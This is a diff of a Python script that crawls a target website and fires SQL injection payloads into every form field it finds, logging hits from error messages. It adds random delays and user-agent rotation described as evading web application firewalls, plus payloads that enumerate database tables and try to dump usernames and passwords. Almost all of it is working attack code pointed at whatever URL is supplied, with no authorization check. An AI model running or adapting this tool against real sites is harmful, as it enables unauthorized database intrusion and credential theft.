@@ -1,115 +1,181 @@
 import requests
 import logging
-import shutil
 import threading
-import sys
-import os
-from urllib.parse import urljoin
+import time
+import random
+from urllib.parse import urljoin, urlparse
 from bs4 import BeautifulSoup
-from inspect import currentframe
+from collections import deque
+from requests.exceptions import RequestException
+import colorlog  # For colored logging
 
-# Configurations
-USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
-SQLI_PAYLOADS = [
-    "' OR 1=1 --",
-    '" OR 1=1 --',
-    "' OR 'a'='a' --",
-    '" OR "a"="a" --',
-    "' UNION SELECT null, null, null --",
-    '" UNION SELECT null, null, null --',
-    "' UNION SELECT NULL, NULL, database() --",
-    "' AND 1=2 UNION SELECT null, null, null --",
-    # Add more complex payloads as required
+# Setup colored logging
+LOG_FORMAT = "[%(levelname)s] %(message)s"
+logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT)
+
+# Create a color log handler
+logger = logging.getLogger()
+handler = colorlog.StreamHandler()
+formatter = colorlog.ColoredFormatter('%(log_color)s' + LOG_FORMAT)
+handler.setFormatter(formatter)
+logger.addHandler(handler)
+
+# Global variables
+found_vulnerabilities = []
+lock = threading.Lock()
+payloads = []
+waf_bypass_payloads = ['/*', ' OR 1=1--', ' AND 1=1--', '%20OR%201%3D1%20--']
+threads = []
+
+# SQL injection payloads
+payloads += [
+    "' OR 1=1 --",  # Basic SQLi payload
+    "' OR 'a'='a",  # Another simple SQL injection
+    "' UNION SELECT NULL,NULL,NULL --",  # Union based injection
+    "' AND 1=2 --",  # False condition (error-based)
+    "' OR 1=1 LIMIT 1 --",  # Limits
+    "' AND SLEEP(5) --",  # Time-based injection
+    "' OR 1=1 --",  # Common injection
+    "'; SELECT table_name FROM information_schema.tables --",  # Tables enumeration
+    "'; SELECT column_name FROM information_schema.columns WHERE table_name = 'users' --",  # Columns enumeration
+    "'; SELECT username, password FROM users --",  # Attempt to dump credentials (example)
 ]
 
-# Setup logger
-logging.basicConfig(filename="sqlscan.log", level=logging.INFO,
-                    format="%(asctime)s - %(message)s")
-logger = logging.getLogger()
+# Headers to make requests seem normal
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+}
 
-def check_sqli(url, payload):
-    """Function to check if the URL is vulnerable to SQL Injection"""
-    try:
-        headers = {'User-Agent': USER_AGENT}
-        response = requests.get(url + payload, headers=headers, timeout=10)
+# Time delay to avoid hitting WAFs
+def delay_request():
+    time.sleep(random.uniform(0.5, 1.5))  # Random delay between 0.5 and 1.5 seconds
 
-        if response.status_code == 200:
-            if "error" in response.text.lower() or "mysql" in response.text.lower() or "syntax" in response.text.lower():
-                logger.info(f"Potential SQLi vulnerability found at: {url} with payload: {payload}")
-                return True
+# Function to evade WAF detection using user-agent rotation
+def get_random_user_agent():
+    agents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0',
+        'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; AS; en-US) like Gecko',
+    ]
+    return random.choice(agents)
+
+# Function to perform SQL injection on a URL with the given payloads
+def test_sql_injection(url, method, form_data):
+    for payload in payloads:
+        data = form_data.copy()  # Avoid modifying original form data
+        for key in data:
+            data[key] = payload  # Inject the payload into each form input field
+
+        try:
+            delay_request()
+            headers['User-Agent'] = get_random_user_agent()
+            if method.lower() == 'get':
+                response = requests.get(url, params=data, headers=headers, timeout=5)
+            elif method.lower() == 'post':
+                response = requests.post(url, data=data, headers=headers, timeout=5)
             else:
-                return False
-    except requests.exceptions.RequestException as e:
-        logger.error(f"Request failed for URL: {url}, Error: {str(e)}")
-    return False
+                continue
 
-def scan_url(url):
-    """Function to scan a URL with multiple payloads"""
-    for payload in SQLI_PAYLOADS:
-        full_url = urljoin(url, payload)
-        logger.info(f"Scanning URL: {full_url}")
-        if check_sqli(full_url, payload):
-            logger.info(f"SQLi vulnerability confirmed at {full_url} with payload: {payload}")
-        else:
-            logger.info(f"No vulnerability found for URL: {full_url}")
+            # Check for SQL injection indicators
+            if "error" in response.text.lower() or response.status_code == 500:  # Error-based SQLi detection
+                with lock:
+                    found_vulnerabilities.append((url, payload, "Possible SQL Injection"))
+                    logger.info(f"SQL Injection found at {url} with payload {payload}")
+            elif response.status_code == 200 and "mysql" in response.text.lower():  # MySQL-based vulnerability detection
+                with lock:
+                    found_vulnerabilities.append((url, payload, "MySQL-based SQL Injection"))
+                    logger.info(f"MySQL-based SQL Injection found at {url} with payload {payload}")
+            elif 'username' in response.text and 'password' in response.text:  # Potential credentials dump (removed dump logic)
+                logger.info(f"Potential credentials found at {url} with payload {payload}")
 
-def scan_urls_in_parallel(urls, num_threads=10):
-    """Function to scan URLs in parallel using threads"""
-    def thread_target(url):
-        scan_url(url)
-    
-    threads = []
-    for url in urls:
-        t = threading.Thread(target=thread_target, args=(url,))
-        t.start()
-        threads.append(t)
+        except RequestException as e:
+            logger.error(f"Error testing {url}: {str(e)}")
 
-        # Control the number of concurrent threads
-        if len(threads) >= num_threads:
-            for t in threads:
-                t.join()
-            threads = []  # Reset threads after waiting
-
-    # Join any remaining threads
-    for t in threads:
-        t.join()
-
-def get_urls_from_page(url):
-    """Function to extract all URLs from a given page using BeautifulSoup"""
+# Function to scan forms on a page
+def scan_forms(url):
     try:
-        headers = {'User-Agent': USER_AGENT}
-        response = requests.get(url, headers=headers, timeout=10)
-        if response.status_code == 200:
+        response = requests.get(url, headers=headers, timeout=5)
+        soup = BeautifulSoup(response.text, 'html.parser')
+
+        forms = soup.find_all('form')
+
+        if not forms:
+            logger.info(f"No forms found on {url}. Skipping this page.")  # Log the message if no forms are found
+            return  # End the function here if no forms are found
+
+        logger.info(f"Scanning {len(forms)} forms on {url}")
+
+        for form in forms:
+            action = form.get('action')
+            method = form.get('method', 'get').lower()
+            action_url = urljoin(url, action)
+
+            form_data = {}
+            inputs = form.find_all('input')
+            for input_tag in inputs:
+                name = input_tag.get('name')
+                if name:
+                    form_data[name] = ""  # Empty data for injection
+
+            if form_data:
+                test_sql_injection(action_url, method, form_data)
+            else:
+                logger.info(f"No form inputs found on {url}.")
+    except RequestException as e:
+        logger.error(f"Error while fetching {url}: {str(e)}")
+
+# Function to crawl and explore the target URL (multiple pages)
+def crawl(url):
+    urls_to_scan = deque([url])
+    visited_urls = set()
+
+    while urls_to_scan:
+        current_url = urls_to_scan.popleft()
+
+        if current_url in visited_urls:
+            continue
+
+        visited_urls.add(current_url)
+        logger.info(f"Scanning {current_url}")
+        scan_forms(current_url)
+
+        # Crawl links on the page
+        try:
+            response = requests.get(current_url, headers=headers, timeout=5)
             soup = BeautifulSoup(response.text, 'html.parser')
-            urls = set()
-            for anchor in soup.find_all('a', href=True):
-                full_url = urljoin(url, anchor['href'])
-                urls.add(full_url)
-            return urls
-    except requests.exceptions.RequestException as e:
-        logger.error(f"Request failed for URL: {url}, Error: {str(e)}")
-    return set()
 
-def main():
-    if len(sys.argv) < 3:
-        print("Usage: sqlscan.py -u <url>")
-        sys.exit(1)
+            # Extract all hyperlinks
+            links = soup.find_all('a', href=True)
+            for link in links:
+                full_url = urljoin(current_url, link['href'])
+                parsed_url = urlparse(full_url)
+                if parsed_url.netloc == urlparse(url).netloc:  # Limit to the same domain
+                    urls_to_scan.append(full_url)
 
-    if sys.argv[1] == "-u":
-        base_url = sys.argv[2]
+        except RequestException as e:
+            logger.error(f"Error fetching links from {current_url}: {str(e)}")
 
-        if not base_url.startswith("http"):
-            base_url = "http://" + base_url
+# Main function
+def main(target_url):
+    logger.info(f"Starting SQL Injection scan on {target_url}")
+    start_time = time.time()
 
-        logger.info(f"Starting SQLi brute force scan for: {base_url}")
+    crawl(target_url)
 
-        # Get all URLs on the target site
-        urls_to_scan = get_urls_from_page(base_url)
-        logger.info(f"Found {len(urls_to_scan)} URLs to scan")
+    if found_vulnerabilities:
+        logger.info("SQL Injection vulnerabilities found:")
+        for vuln in found_vulnerabilities:
+            print(f"Vulnerability found at: {vuln[0]} with payload: {vuln[1]}")
 
-        # Scan URLs in parallel
-        scan_urls_in_parallel(urls_to_scan)
-        logger.info("SQLi scan completed.")
+    else:
+        logger.info("No vulnerabilities found.")
 
-if __name__ == "__main__":
-    main()
+    logger.info(f"Scan completed in {time.time() - start_time:.2f} seconds")
+
+if __name__ == '__main__':
+    import argparse
+    parser = argparse.ArgumentParser(description="SQL Injection Scanner")
+    parser.add_argument('-u', '--url', type=str, required=True, help="Target URL")
+    args = parser.parse_args()
+
+    main(args.url)
